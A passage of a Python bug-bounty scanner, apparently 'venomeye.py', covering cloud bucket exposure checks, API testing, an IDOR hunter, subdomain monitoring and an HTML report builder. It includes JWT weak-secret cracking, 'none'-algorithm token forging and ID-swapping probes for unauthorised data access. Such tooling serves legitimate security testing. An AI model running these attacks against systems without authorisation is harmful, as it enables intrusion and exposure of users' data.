            # Must have storage-specific kind AND items — "kind" alone appears in error responses
            if ('"storage#objects"' in body or '"storage#buckets"' in body) and \
               ('"items"' in body or '"prefixes"' in body):
                return {"service":"GCP Storage","bucket":name,"url":url,"status":"OPEN-listable","severity":"critical","body":body[:400]}
    return None

def _check_firebase(name: str) -> dict | None:
    url = f"https://{name}.firebaseio.com/.json"
    sc, body = _curl_simple(url, 10)
    if sc == 200:
        b = body.strip()
        # Reject known non-data responses
        if b in ("null", "", "false"):
            return None
        # Reject permission denied — locked database, not open
        if '"error"' in b and ("Permission denied" in b or "permission_denied" in b):
            return None
        # Must look like real JSON data
        if b.startswith(("{", "[")):
            return {"service":"Firebase","bucket":name,"url":url,"status":"OPEN-readable","severity":"critical","body":b[:400]}
    return None

def _check_service(host: str) -> list[dict]:
    findings = []
    base = host.rstrip("/")
    for path, indicator, service, severity in CLOUD_SERVICES_CHECK:
        url = base + path if path else base
        sc, body = _curl_simple(url, 6)
        # Only flag HTTP 200 — 301/302 are redirects, not exposures
        if sc != 200:
            continue
        # Reject HTML responses — SPA/CDN apps return 200 for every route
        if _HTML_START_RE.search(body[:200]):
            continue
        # For heapdump: check binary Content-Type instead of body pattern
        if service == "Spring heapdump":
            # Re-fetch with headers to check Content-Type
            r = subprocess.run(
                ["curl","-sk","--max-time","6","-I",url],
                capture_output=True, text=True, timeout=8)
            if "application/octet-stream" not in r.stdout.lower() and \
               "application/x-java-heap-dump" not in r.stdout.lower():
                continue
            findings.append({"service":service,"url":url,"status":"HTTP 200","severity":severity,"body":""})
            crit(f"{service} exposed | {url}")
            continue
        # All other services: indicator must match in body
        if not indicator or re.search(indicator, body, re.MULTILINE):
            findings.append({"service":service,"url":url,"status":f"HTTP {sc}","severity":severity,"body":body[:300]})
            (crit if severity=="critical" else warn)(f"{service} exposed | {url}")
    return findings

def phase_cloud_misconfig(domain: str, out_dir: str, threads: int = 30):
    section("PHASE 12 — Cloud Misconfiguration Scanner")
    cloud_dir = f"{out_dir}/cloud_results"
    os.makedirs(cloud_dir, exist_ok=True)

    bucket_names = _generate_bucket_names(domain)
    info(f"Generated {len(bucket_names)} bucket name permutations")
    all_findings: list[dict] = []

    for checker, label in [(_check_s3,"S3"),(_check_azure,"Azure"),(_check_gcp,"GCP"),(_check_firebase,"Firebase")]:
        info(f"Checking {label}…")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for result in pool.map(checker, bucket_names):
                if result:
                    all_findings.append(result)
                    if result["severity"]=="critical":
                        crit(f"{result['service']} {result['status']} | {result['url']}")

    live_file = f"{out_dir}/live_hosts.txt"
    if Path(live_file).exists():
        info("Checking exposed services on live hosts…")
        hosts = [l.strip() for l in open(live_file) if l.strip()]
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for results in pool.map(_check_service, hosts):
                all_findings.extend(results)

    Path(f"{cloud_dir}/findings.json").write_text(json.dumps(all_findings, indent=2))
    critical = [f for f in all_findings if f.get("severity")=="critical"]
    ok(f"Cloud findings — Critical: {C.BOLD}{len(critical)}{C.RESET} | Total: {len(all_findings)}")

# ══════════════════════════════════════════════════════════════
# PHASE 13 — API Security Testing
# ══════════════════════════════════════════════════════════════
SWAGGER_PATHS = [
    "/swagger.json","/swagger/v1/swagger.json","/openapi.json","/api-docs",
    "/v1/api-docs","/v2/api-docs","/v3/api-docs","/swagger-ui.html",
    "/api/swagger.json","/.well-known/openapi.json",
]
GRAPHQL_PATHS = ["/graphql","/graphiql","/__graphql","/api/graphql","/v1/graphql","/query","/gql"]
WEAK_JWT_SECRETS = ["secret","password","123456","qwerty","admin","default","key","jwt",
                    "mysecret","your-256-bit-secret","test","development","changeme",""]

def _decode_jwt(token: str) -> tuple[dict, dict]:
    parts = token.split(".")
    if len(parts) != 3:
        return {}, {}
    try:
        header  = json.loads(base64.urlsafe_b64decode(parts[0]+"=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1]+"=="))
        return header, payload
    except Exception:
        return {}, {}

def _forge_none_alg(token: str) -> str:
    parts = token.split(".")
    if len(parts) != 3:
        return ""
    hdr = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    return f"{hdr}.{parts[1]}."

def _crack_jwt(token: str) -> str | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    msg = f"{parts[0]}.{parts[1]}".encode()
    try:
        sig = base64.urlsafe_b64decode(parts[2]+"==")
    except Exception:
        return None
    for secret in WEAK_JWT_SECRETS:
        try:
            expected = hmac_mod.new(secret.encode(), msg, hashlib.sha256).digest()
            if hmac_mod.compare_digest(expected, sig):
                return secret
        except Exception:
            continue
    return None

def phase_api_tester(out_dir: str, cookie: str = "", jwt_token: str = "", threads: int = 15):
    section("PHASE 13 — API Security Testing")
    api_dir = f"{out_dir}/api_results"
    os.makedirs(api_dir, exist_ok=True)
    all_findings: list[dict] = []

    live_file = f"{out_dir}/live_hosts.txt"
    if not Path(live_file).exists():
        warn("No live_hosts.txt — skipping API scan")
        return

    hosts = [l.strip() for l in open(live_file) if l.strip()]
    headers = {"Cookie":cookie} if cookie else {}

    # swagger/openapi discovery
    info(f"Scanning {len(hosts)} hosts for API specs…")
    for host in hosts:
        base = host.rstrip("/")
        for path in SWAGGER_PATHS:
            url = base + path
            sc, body = _curl_simple(url, 8)
            if sc != 200 or not body.strip():
                continue
            try:
                spec = json.loads(body)
                if "paths" in spec:
                    ok(f"API spec: {url}")
                    servers = spec.get("servers",[{"url":base}])
                    server_url = (servers[0].get("url",base) if servers else base)
                    if server_url.startswith("/"):
                        server_url = base + server_url
                    for api_path, methods in spec.get("paths",{}).items():
                        for method in methods:
                            if method.upper() not in ("GET","POST","PUT","DELETE","PATCH"):
                                continue
                            test_url = server_url.rstrip("/") + re.sub(r"\{[^}]+\}","1",api_path)
                            sc2, _, rbody = _curl_api(test_url, method.upper(), headers or None, timeout=8)
                            if sc2 in (200,201) and "unauthorized" not in rbody.lower():
                                all_findings.append({"type":"unauth_api","severity":"high",
                                    "method":method.upper(),"url":test_url,"status":sc2,"body":rbody[:200]})
                                warn(f"UNAUTH {method.upper()} {test_url} → {sc2}")
                    break
            except Exception:
                pass

    # GraphQL
    info("Checking GraphQL endpoints…")
    gql_query = {"query":"{ __schema { types { name } } }"}
    for host in hosts:
        base = host.rstrip("/")
        for path in GRAPHQL_PATHS:
            url = base + path
            sc, _, body = _curl_api(url, "POST", {"Content-Type":"application/json"}, gql_query, 8)
            if sc not in (200,400,500) or not body:
                continue
            if "__schema" in body and '"types"' in body:
                all_findings.append({"type":"graphql_introspection","severity":"medium",
                                     "url":url,"body":body[:400]})
                warn(f"GraphQL introspection enabled: {url}")
                break

    # JWT attacks from URLs
    jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
    tokens_to_test: set[str] = set()
    if jwt_token:
        tokens_to_test.add(jwt_token)
    urls_file = f"{out_dir}/urls_all.txt"
    if Path(urls_file).exists():
        for line in open(urls_file):
            for m in jwt_re.finditer(line):
                tokens_to_test.add(m.group(0))

    for token in tokens_to_test:
        hdr, payload = _decode_jwt(token)
        if not hdr:
            continue
        info(f"JWT: alg={hdr.get('alg')} sub={payload.get('sub','?')}")
        secret = _crack_jwt(token)
        if secret is not None:
            all_findings.append({"type":"jwt_weak_secret","severity":"critical",
                                 "secret":secret,"payload":payload,"token":token[:80]})
            crit(f"JWT weak secret '{secret}' cracked!")
        forged = _forge_none_alg(token)
        if forged and hosts:
            test_url = hosts[0]
            sc, _, body = _curl_api(test_url, headers={"Authorization":f"Bearer {forged}"}, timeout=8)
            if sc == 200 and "unauthorized" not in body.lower():
                all_findings.append({"type":"jwt_none_alg","severity":"critical",
                                     "url":test_url,"forged":forged[:80]})
                crit(f"JWT none-alg bypass! {test_url}")

    Path(f"{api_dir}/findings.json").write_text(json.dumps(all_findings, indent=2))
    ok(f"API findings: {C.BOLD}{len(all_findings)}{C.RESET} → {api_dir}/")

# ══════════════════════════════════════════════════════════════
# PHASE 14 — IDOR / BOLA Hunter
# ══════════════════════════════════════════════════════════════
NUMERIC_ID_RE  = re.compile(r"/(\d{1,10})(?:/|$|\?|#)")
PARAM_ID_RE    = re.compile(r"[?&](id|user_?id|account_?id|order_?id|invoice_?id|file_?id|doc_?id|post_?id|profile_?id|customer_?id|ticket_?id)=(\d+)", re.IGNORECASE)
IDOR_KEYWORDS  = re.compile(r"/(user|account|profile|order|invoice|payment|file|document|ticket|admin|member|customer|subscription|message)/", re.IGNORECASE)
SENSITIVE_FIELDS_RE = re.compile(r'"(email|username|phone|address|ssn|dob|credit|account|balance|password|token|secret|api_key|invoice|payment|card)"', re.IGNORECASE)

def _is_sensitive(sc: int, body: str) -> bool:
    return sc in (200,201) and bool(SENSITIVE_FIELDS_RE.search(body))

def _sub_path_id(url: str, old: str, new: str) -> str:
    return re.sub(f"/{re.escape(old)}(?=/|$|\\?|#)", f"/{new}", url, count=1)

def _sub_param_id(url: str, param: str, new: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in params:
        params[param] = [new]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params, doseq=True)))

def _test_idor(url: str, cookie1: str, cookie2: str, timeout: int) -> list[dict]:
    findings = []

    for m in NUMERIC_ID_RE.finditer(url):
        orig_id  = m.group(1)
        orig_num = int(orig_id)
        base_sc, base_len, base_body, _ = _curl_req(url, cookie1, timeout=timeout)
        if base_sc not in (200,201):
            continue
        for tid in [str(orig_num+1), str(orig_num-1), "1", "2"]:
            if tid == orig_id:
                continue
            test_url = _sub_path_id(url, orig_id, tid)
            sc, blen, body, _ = _curl_req(test_url, cookie1, timeout=timeout)
            if _is_sensitive(sc, body):
                findings.append({"type":"idor_path","severity":"high","original_url":url,
                                 "test_url":test_url,"orig_id":orig_id,"tested_id":tid,
                                 "status":sc,"body":body[:200]})
                crit(f"IDOR path | {orig_id}→{tid} | {url}")
        if cookie2 and _is_sensitive(base_sc, base_body):
            sc2, _, body2, _ = _curl_req(url, cookie2, timeout=timeout)
            if _is_sensitive(sc2, body2):
                findings.append({"type":"idor_cross_account","severity":"critical","url":url,
                                 "note":"Account B accessed Account A resource","body":body2[:200]})
                crit(f"CROSS-ACCOUNT IDOR | {url}")
        break

    for m in PARAM_ID_RE.finditer(url):
        param_name, orig_id = m.group(1), m.group(2)
        orig_num = int(orig_id)
        base_sc, _, base_body, _ = _curl_req(url, cookie1, timeout=timeout)
        if base_sc not in (200,201):
            continue
        for tid in [str(orig_num+1), str(orig_num-1), "1"]:
            if tid == orig_id:
                continue
            test_url = _sub_param_id(url, param_name, tid)
            sc, _, body, _ = _curl_req(test_url, cookie1, timeout=timeout)
            if _is_sensitive(sc, body):
                findings.append({"type":"idor_param","severity":"high","original_url":url,
                                 "test_url":test_url,"param":param_name,"tested_id":tid,
                                 "status":sc,"body":body[:200]})
                crit(f"IDOR param | {param_name}:{orig_id}→{tid} | {url}")
                break
        break

    return findings

def phase_idor_hunter(out_dir: str, cookie: str = "", cookie2: str = "",
                      threads: int = 10, limit: int = 500, timeout: int = 10,
                      check_unauth: bool = True):
    section("PHASE 14 — IDOR / BOLA Hunter")
    urls_file = f"{out_dir}/urls_all.txt"
    if not Path(urls_file).exists():
        warn("No urls_all.txt — run phase 4 first")
        return

    idor_dir = f"{out_dir}/idor_results"
    os.makedirs(idor_dir, exist_ok=True)

    # extract candidates
    candidates: list[str] = []
    seen: set[str] = set()
    for line in open(urls_file):
        url = line.strip()
        if not url:
            continue
        norm = NUMERIC_ID_RE.sub("/ID/", url)
        norm = PARAM_ID_RE.sub(r"[\1=ID]", norm)
        if norm in seen:
            continue
        if NUMERIC_ID_RE.search(url) or PARAM_ID_RE.search(url) or IDOR_KEYWORDS.search(url):
            seen.add(norm)
            candidates.append(url)

    candidates = candidates[:limit]
    info(f"IDOR candidates: {len(candidates)} | cookie={'yes' if cookie else 'none'}")

    all_findings: list[dict] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_test_idor, u, cookie, cookie2, timeout): u for u in candidates}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 100 == 0:
                info(f"IDOR progress: {done}/{len(candidates)}")
            try:
                all_findings.extend(fut.result())
            except Exception:
                pass

    if check_unauth:
        info("Checking unauthenticated access…")
        def _unauth(url):
            sc, blen, body, _ = _curl_req(url, "", timeout=timeout)
            if _is_sensitive(sc, body):
                return {"type":"unauth_access","severity":"critical","url":url,"body":body[:200]}
            return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for result in pool.map(_unauth, candidates):
                if result:
                    all_findings.append(result)
                    crit(f"UNAUTH ACCESS | {result['url']}")

    Path(f"{idor_dir}/findings.json").write_text(json.dumps(all_findings, indent=2))
    critical = [x for x in all_findings if x.get("severity")=="critical"]
    ok(f"IDOR findings — Critical: {C.BOLD}{len(critical)}{C.RESET} | Total: {len(all_findings)}")

# ══════════════════════════════════════════════════════════════
# PHASE 15 — Subdomain Monitor (continuous delta tracking)
# ══════════════════════════════════════════════════════════════
def _monitor_enumerate(domain: str, tmp_dir: str) -> set[str]:
    parts, subs = [], set()
    os.makedirs(tmp_dir, exist_ok=True)
    if tool_exists("subfinder"):
        f = f"{tmp_dir}/sf.txt"
        run(f"subfinder -d {domain} -silent -o {f}", timeout=240)
        parts.append(f)
    if tool_exists("assetfinder"):
        f = f"{tmp_dir}/af.txt"
        run(f"assetfinder --subs-only {domain} > {f}", timeout=120)
        parts.append(f)
    r = run(f'curl -s "https://crt.sh/?q=%.{domain}&output=json"', timeout=30)
    if r.stdout:
        try:
            for e in json.loads(r.stdout):
                for name in e.get("name_value","").split("\n"):
                    name = name.strip().lstrip("*.")
                    if domain in name:
                        subs.add(name)
        except Exception:
            pass
    for f in parts:
        subs |= read_set(f)
    shutil.rmtree(tmp_dir, ignore_errors=True)
    return subs

def _monitor_probe(subs: set[str], tmp_dir: str) -> set[str]:
    os.makedirs(tmp_dir, exist_ok=True)
    sf = f"{tmp_dir}/subs.txt"
    write_set(sf, subs)
    resolved_f = f"{tmp_dir}/resolved.txt"
    if tool_exists("dnsx"):
        run(f"dnsx -l {sf} -silent -o {resolved_f}", timeout=240)
        resolved = read_set(resolved_f)
    else:
        resolved = subs
    if not resolved:
        return set()
    write_set(resolved_f, resolved)
    if tool_exists("httpx"):
        live_f = f"{tmp_dir}/live.txt"
        run(f"httpx -l {resolved_f} -silent -o {live_f} -threads 50 -timeout 8", timeout=360)
        return read_set(live_f)
    return resolved

def _notify(webhook: str, platform: str, msg: str):
    if not webhook:
        return
    payload = json.dumps({"text" if platform=="slack" else "content": msg[:2000]})
    subprocess.run(["curl","-sk","-X","POST","-H","Content-Type: application/json",
                    "-d",payload,webhook], capture_output=True, timeout=10)

def phase_monitor(domain: str, out_dir: str, interval: int = 3600,
                  run_once: bool = True, slack_wh: str = "", discord_wh: str = ""):
    section("PHASE 15 — Subdomain Monitor")
    monitor_dir = f"{out_dir}/monitor"
    os.makedirs(monitor_dir, exist_ok=True)

    running = True
    def _stop(sig, frame):
        nonlocal running
        running = False
    signal.signal(signal.SIGINT,  _stop)
    signal.signal(signal.SIGTERM, _stop)

    prev_subs: set[str]  = set()
    prev_live: set[str]  = set()
    baseline_path = f"{monitor_dir}/baseline.json"
    if Path(baseline_path).exists():
        try:
            baseline = json.loads(Path(baseline_path).read_text())
            prev_subs = set(baseline.get("subs",[]))
            prev_live = set(baseline.get("live",[]))
            info(f"Loaded baseline: {len(prev_subs)} subs, {len(prev_live)} live")
        except Exception:
            pass

    cycle = 0
    while running:
        cycle += 1
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        info(f"Monitor cycle {cycle} — {ts}")
        tmp = f"{monitor_dir}/{ts}_tmp"
        subs = _monitor_enumerate(domain, tmp)
        live = _monitor_probe(subs, f"{tmp}_probe")

        alerts = []
        if prev_subs:
            new_subs  = subs - prev_subs
            gone_subs = prev_subs - subs
            new_live  = live - prev_live
            if new_subs:
                alerts.append(f"NEW SUBDOMAINS ({len(new_subs)}): {', '.join(list(new_subs)[:5])}")
                for s in new_subs: ok(f"[NEW SUB] {s}")
            if new_live:
                alerts.append(f"NEW LIVE HOSTS ({len(new_live)}): {', '.join(list(new_live)[:5])}")
                for h in new_live: ok(f"[NEW HOST] {h}")
            if gone_subs:
                alerts.append(f"GONE SUBDOMAINS ({len(gone_subs)}) — possible takeover: {', '.join(list(gone_subs)[:5])}")
                for s in gone_subs: warn(f"[GONE] {s}")
            if alerts:
                msg = f"[{domain}] Recon alert:\n" + "\n".join(alerts)
                _notify(slack_wh, "slack", msg)
                _notify(discord_wh, "discord", msg)
                delta_file = f"{monitor_dir}/delta_{ts}.txt"
                Path(delta_file).write_text(msg)
        else:
            ok(f"Baseline set: {len(subs)} subs, {len(live)} live")

        Path(baseline_path).write_text(json.dumps({"subs":sorted(subs),"live":sorted(live),"ts":ts}))
        prev_subs, prev_live = subs, live

        if run_once:
            break
        info(f"Next scan in {interval}s…")
        for _ in range(interval):
            if not running:
                break
            time.sleep(1)

# ══════════════════════════════════════════════════════════════
# PHASE 16 — HTML + Markdown Report Builder
# ══════════════════════════════════════════════════════════════
SEV_ORDER  = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
SEV_BADGE  = {"critical":"#e74c3c","high":"#e67e22","medium":"#f1c40f","low":"#3498db","info":"#95a5a6"}

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>Bug Bounty Report — {domain}</title>
<style>
:root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#c9d1d9;--muted:#8b949e;}}
*{{box-sizing:border-box;margin:0;padding:0;}}
body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,monospace;font-size:14px;}}
header{{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:30px 40px;border-bottom:1px solid var(--border);}}
header h1{{font-size:24px;color:#58a6ff;}} header p{{color:var(--muted);font-size:13px;margin-top:6px;}}
.container{{max-width:1400px;margin:0 auto;padding:20px 40px;}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin:20px 0;}}
.stat{{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;text-align:center;}}
.stat .n{{font-size:30px;font-weight:700;}} .stat .l{{color:var(--muted);font-size:11px;margin-top:4px;}}
.crit{{color:#e74c3c!important;}} .high{{color:#e67e22!important;}} .med{{color:#f1c40f!important;}}
.low{{color:#3498db!important;}} .inf{{color:#95a5a6!important;}}
.badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;}}
.bc{{background:#3d0c0c;color:#e74c3c;}} .bh{{background:#3d1f0c;color:#e67e22;}}
.bm{{background:#3d360c;color:#f1c40f;}} .bl{{background:#0c2040;color:#3498db;}}
.bi{{background:#1e1e1e;color:#95a5a6;}}
h2{{color:#58a6ff;font-size:17px;margin:26px 0 12px;border-bottom:1px solid var(--border);padding-bottom:6px;}}
table{{width:100%;border-collapse:collapse;background:var(--card);border-radius:10px;overflow:hidden;margin-bottom:20px;}}
th{{background:#1c2330;color:#58a6ff;padding:10px 12px;text-align:left;font-size:12px;cursor:pointer;}}
th:hover{{background:#243040;}}
td{{padding:8px 12px;border-top:1px solid var(--border);font-size:13px;vertical-align:top;word-break:break-all;}}
tr:hover td{{background:#1c2330;}}
.poc{{background:#0d1117;border:1px solid var(--border);border-radius:5px;padding:6px 10px;
      font-family:monospace;font-size:11px;color:#7ee787;position:relative;max-width:480px;}}
.cp{{position:absolute;top:3px;right:5px;background:#21262d;border:1px solid var(--border);
     color:var(--muted);border-radius:3px;padding:1px 7px;cursor:pointer;font-size:11px;}}
.cp:hover{{color:var(--text);}}
input.search{{background:var(--card);border:1px solid var(--border);color:var(--text);
              padding:6px 14px;border-radius:20px;font-size:13px;width:240px;}}
input.search:focus{{outline:none;border-color:#58a6ff;}}
.fbtns{{display:inline-flex;gap:8px;flex-wrap:wrap;}}
.fb{{background:var(--card);border:1px solid var(--border);color:var(--text);padding:4px 13px;
     border-radius:20px;cursor:pointer;font-size:12px;}}
.fb.active{{border-color:#58a6ff;color:#58a6ff;}}
.surf{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px;}}
.si{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px;}}
.si h4{{color:#58a6ff;font-size:12px;margin-bottom:4px;}} .si span{{font-size:22px;font-weight:700;}}
footer{{color:var(--muted);font-size:11px;text-align:center;padding:24px;border-top:1px solid var(--border);margin-top:30px;}}
</style></head><body>
<header>
  <h1>Bug Bounty Report — {domain}</h1>
  <p><strong>Date:</strong> {date} &nbsp;|&nbsp; <strong>Duration:</strong> {duration} &nbsp;|&nbsp; <strong>Findings:</strong> {total}</p>
</header>
<div class="container">
<div class="stats">
  <div class="stat"><div class="n crit">{cnt_crit}</div><div class="l">Critical</div></div>
  <div class="stat"><div class="n high">{cnt_high}</div><div class="l">High</div></div>
  <div class="stat"><div class="n med">{cnt_med}</div><div class="l">Medium</div></div>
  <div class="stat"><div class="n low">{cnt_low}</div><div class="l">Low</div></div>
  <div class="stat"><div class="n inf">{cnt_info}</div><div class="l">Info</div></div>
</div>
<h2>Attack Surface</h2>
<div class="surf">
  <div class="si"><h4>Subdomains</h4><span>{subdomains}</span></div>
  <div class="si"><h4>Live Hosts</h4><span>{live_hosts}</span></div>
  <div class="si"><h4>Open Ports</h4><span>{open_ports}</span></div>
  <div class="si"><h4>Total URLs</h4><span>{urls}</span></div>
  <div class="si"><h4>Param URLs</h4><span>{params}</span></div>
  <div class="si"><h4>JS Files</h4><span>{js_files}</span></div>
</div>
<h2>Findings</h2>
<div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:10px;">
  <input type="text" class="search" id="srch" placeholder="Search…" oninput="filterT()">
  <div class="fbtns" id="fbtns">
    <button class="fb active" onclick="setF('all',this)">All</button>
    <button class="fb" onclick="setF('critical',this)">Critical</button>
    <button class="fb" onclick="setF('high',this)">High</button>
    <button class="fb" onclick="setF('medium',this)">Medium</button>
    <button class="fb" onclick="setF('low',this)">Low</button>
  </div>
</div>
<table><thead><tr>
  <th onclick="srt(0)">#</th><th onclick="srt(1)">Sev</th><th onclick="srt(2)">Title</th>
  <th onclick="srt(3)">URL</th><th onclick="srt(4)">CVE</th><th onclick="srt(5)">Source</th><th>PoC</th>
</tr></thead>
<tbody id="tb">{rows}</tbody></table>
</div>
<footer>Generated by venomeye.py (Mega Edition) | {date}</footer>
<script>
let cf='all';
function setF(s,b){{cf=s;document.querySelectorAll('.fb').forEach(x=>x.classList.remove('active'));b.classList.add('active');filterT();}}
function filterT(){{const q=document.getElementById('srch').value.toLowerCase();
  document.querySelectorAll('#tb tr').forEach(r=>{{
    const sm=(cf==='all'||r.dataset.sev===cf),tm=(!q||r.textContent.toLowerCase().includes(q));
    r.style.display=(sm&&tm)?'':'none';}});}}
function srt(c){{const tb=document.getElementById('tb');const rows=[...tb.querySelectorAll('tr')];
  const d=tb.dataset.d==='a'?'d':'a';tb.dataset.d=d;
  rows.sort((a,b)=>{{const at=a.cells[c]?.textContent.trim()||'',bt=b.cells[c]?.textContent.trim()||'';
    return d==='a'?at.localeCompare(bt):bt.localeCompare(at);}});rows.forEach(r=>tb.appendChild(r));}}
function cp(id){{const el=document.getElementById('p'+id);if(el)navigator.clipboard.writeText(el.textContent.trim());}}
</script></body></html>"""

def _esc(s: str) -> str:
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"','&quot;')

def _load_all_findings(out_dir: str) -> list[dict]:
    all_findings: list[dict] = []
    TYPE_SEV = {
        "ssrf_metadata":"critical","idor_cross_account":"critical","unauth_access":"critical",
        "jwt_none_alg":"critical","jwt_weak_secret":"critical","ssti":"critical","sqli":"critical",
        "xss":"high","idor_path":"high","idor_param":"high","mass_assignment":"high",
        "unauth_api":"high","graphql_introspection":"medium","open_redirect":"medium",
        "secret":"critical","internal_ip":"medium","endpoint":"info",
    }

    # nuclei JSONL files
    for nj in [f"{out_dir}/nuclei_findings.json", f"{out_dir}/cve_checks/nuclei_cve.json"]:
        if not Path(nj).exists():
            continue
        for line in open(nj, errors="ignore"):
            line = line.strip()
            if not line:
                continue
            try:
                item = json.loads(line)
                if not isinstance(item, dict):
                    continue
                info_obj = item.get("info") or {}
                if not isinstance(info_obj, dict):
                    info_obj = {}
                classification = info_obj.get("classification") or {}
                if not isinstance(classification, dict):
                    classification = {}
                cve_ids = classification.get("cve-id",[])
                if isinstance(cve_ids, str):
                    cve_ids = [cve_ids] if cve_ids else []
                all_findings.append({
                    "source":"nuclei","severity":info_obj.get("severity","info").lower(),
                    "title":info_obj.get("name","Unknown"),
                    "url":item.get("matched-at",item.get("host","")),
                    "cve":", ".join(cve_ids),"cvss":str(classification.get("cvss-score","")),
                    "poc":item.get("matched-at",""),
                })
            except Exception:
                continue

    # scanner JSON outputs
    scanner_dirs = [
        (f"{out_dir}/js_analysis/findings.json",   "js_analyzer"),
        (f"{out_dir}/ssrf_results/ssrf_findings.json", "ssrf_tester"),
        (f"{out_dir}/param_scan/findings.json",    "param_scanner"),
        (f"{out_dir}/cloud_results/findings.json", "cloud_misconfig"),
        (f"{out_dir}/api_results/findings.json",   "api_tester"),
        (f"{out_dir}/idor_results/findings.json",  "idor_hunter"),
    ]
    for fpath, source in scanner_dirs:
        if not Path(fpath).exists():
            continue
        try:
            raw = json.loads(Path(fpath).read_text())
            if not isinstance(raw, list):
                raw = [raw]
            for item in raw:
                if not isinstance(item, dict):
                    continue
                vtype = item.get("type","")
                # Prefer explicit severity stored on item; fall back to type-based default
                sev   = item.get("severity") or TYPE_SEV.get(vtype,"info")
                # Skip pure info/endpoint entries from report (noise)
                if vtype == "endpoint":
                    continue
                title = item.get("title", item.get("label", item.get("type","Finding")))
                url   = item.get("url", item.get("injected", item.get("original_url","")))
                poc   = item.get("poc", item.get("injected", item.get("test_url", url)))
                all_findings.append({
                    "source":source,"severity":sev if sev in SEV_ORDER else "info",
                    "title":str(title)[:100],"url":str(url)[:300],
                    "cve":item.get("cve",""),"cvss":str(item.get("cvss","")),
                    "poc":str(poc)[:500],
                })
        except Exception:
            continue

    # plain text files — only sources that aren't already loaded from JSON
    # NOTE: js_analysis/secrets.txt is NOT included here because js_analysis/findings.json
    # is already loaded above (including deduplicated secrets). Including both causes double-counting.
    plain = [
        (f"{out_dir}/manual_checks/cors_issues.txt",          "CORS misconfiguration","medium"),
        (f"{out_dir}/manual_checks/takeover_candidates.txt",  "Subdomain takeover",   "critical"),
        (f"{out_dir}/ssl/expired_certs.txt",                  "Expired cert",         "medium"),
        # exposed_paths are unverified candidates — mark info; only include confirmed non-HTML ones
        (f"{out_dir}/manual_checks/exposed_paths.txt",        "Exposed path (verify)","info"),
    ]
    for fpath, source, default_sev in plain:
        if not Path(fpath).exists():
            continue
        for line in open(fpath, errors="ignore"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # For exposed paths: only include paths that look genuinely sensitive, not admin UIs
            if source == "Exposed path (verify)":
                # Only flag obviously sensitive paths in report
                interesting = any(x in line for x in [
                    ".env","credentials","config.json","config.yml","config.php","wp-config",
                    ".git/","passwd","heapdump","actuator/env","dump.sql","db.sql","backup",
                    "swagger.json","openapi.json","api-docs","v2/api-docs","phpinfo","adminer",
                ])
                if not interesting:
                    continue
                sev = "medium"  # elevated from info since path is sensitive
            else:
                sev = default_sev
            m = re.match(r"\[([A-Z_:]+)\]\s*(.*)", line)
            title = source
            if m:
                tag = m.group(1)
                line = m.group(2)
                if "CRIT" in tag or "TAKEOVER" in tag:
                    sev = "critical"
                elif "HIGH" in tag:
                    sev = "high"
                title = tag
            all_findings.append({"source":source,"severity":sev,"title":title,
                                  "url":line[:300],"cve":"","cvss":"","poc":line[:300]})

    # deduplicate
    seen: set[tuple] = set()
    deduped = []
    for f in sorted(all_findings, key=lambda x: SEV_ORDER.get(x.get("severity","info"),9)):
        key = (f.get("title",""), f.get("url",""))
        if key not in seen:
            seen.add(key)
            deduped.append(f)
    return deduped

def _build_html_row(idx: int, f: dict) -> str:
    sev  = f.get("severity","info").lower()
    bcls = {"critical":"bc","high":"bh","medium":"bm","low":"bl","info":"bi"}.get(sev,"bi")
    badge = f'<span class="badge {bcls}">{sev.upper()}</span>'
    title = _esc(f.get("title",""))
    url   = _esc(f.get("url",""))
    cve   = _esc(f.get("cve",""))
    src   = _esc(f.get("source",""))
    poc   = _esc(f.get("poc",""))
    poc_html = (f'<div class="poc" id="p{idx}">{poc}'
                f'<button class="cp" onclick="cp({idx})">copy</button></div>') if poc else ""
    return (f'<tr data-sev="{sev}"><td>{idx}</td><td>{badge}</td><td>{title}</td>'
            f'<td style="max-width:280px">{url}</td><td>{cve}</td><td>{src}</td><td>{poc_html}</td></tr>')

def generate_report(domain: str, out_dir: str, start_time: float):
    section("PHASE 16 — Report Builder")
    elapsed = time.time() - start_time
    findings = _load_all_findings(out_dir)

    by_sev: dict[str,int] = {s:0 for s in SEV_ORDER}
    for f in findings:
        sev = f.get("severity","info")
        if sev in by_sev:
            by_sev[sev] += 1

    surf = {
        "subdomains": count_lines(f"{out_dir}/subdomains_all.txt"),
        "live_hosts":  count_lines(f"{out_dir}/live_hosts.txt"),
        "open_ports":  count_lines(f"{out_dir}/ports_naabu.txt"),
        "urls":        count_lines(f"{out_dir}/urls_all.txt"),
        "params":      count_lines(f"{out_dir}/params.txt"),
